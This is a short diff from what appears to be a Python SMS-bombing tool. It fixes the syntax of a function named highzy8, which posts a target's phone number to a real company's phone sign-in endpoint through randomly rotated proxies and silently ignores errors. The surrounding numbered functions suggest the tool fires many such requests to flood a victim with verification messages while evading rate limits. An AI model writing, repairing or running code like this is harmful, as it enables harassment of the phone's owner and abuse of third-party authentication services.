@@ -915,7 +915,7 @@ def run():
                         except:pass
                     def highzy8():
                         try:
-                            httpx.post(f"https://globalapi.pointspot.co/papi/oauth2/signinWithPhone", data={"phoneNumber": f'{phone}',proxies={'http': 'http://' + random.choice(s)})
+                            httpx.post(f"https://globalapi.pointspot.co/papi/oauth2/signinWithPhone",data={"phoneNumber": phone},proxies={'http': 'http://' + random.choice(s)})
                         except:pass
                     def highzy9():
                         try:
